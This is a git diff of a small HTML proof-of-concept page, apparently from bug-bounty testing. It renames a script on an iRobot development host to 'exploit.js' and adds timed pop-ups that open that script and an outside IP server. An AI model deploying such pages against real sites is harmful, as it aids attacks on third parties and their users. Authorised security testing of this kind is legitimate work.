@@ -6,7 +6,7 @@ hello_ltidi_from_h1
   <title>Open Two Windows</title>
   <script>
     function openTwoWindows() {
-      var url = "https://services-dev.irobot.com/poc.js";
+      var url = "https://services-dev.irobot.com/exploit.js";
       var server = "http://170.64.186.216:8001";
 
       // Open the first window
@@ -34,8 +34,12 @@ hello_ltidi_from_h1
       }, 10000);
 
       setTimeout(function() {
-        var window7 = window.open(server, "_blank");
-      }, 11000);
+        var window7 = window.open(url, "_blank");
+      }, 12000);
+
+      setTimeout(function() {
+        var window8 = window.open(server, "_blank");
+      }, 13000);
     }
   </script>
 </head>
